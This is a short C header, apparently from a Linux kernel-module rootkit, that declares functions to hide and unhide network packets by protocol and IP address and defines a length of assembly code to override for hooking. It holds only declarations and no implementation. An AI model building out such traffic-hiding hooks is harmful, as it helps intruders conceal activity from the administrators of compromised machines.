#ifndef PACKET_HIDING
#define PACKET_HIDING

#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/string.h>
#include <linux/netfilter_defs.h>

/* length of assembly to override */
#define ASSEMBLY_LENGTH 12

void packet_hide(char *protocol, char *ip);
void packet_unhide(char *protocol, char *ip);

int packet_hiding_init(void);
void packet_hiding_exit(void);

#endif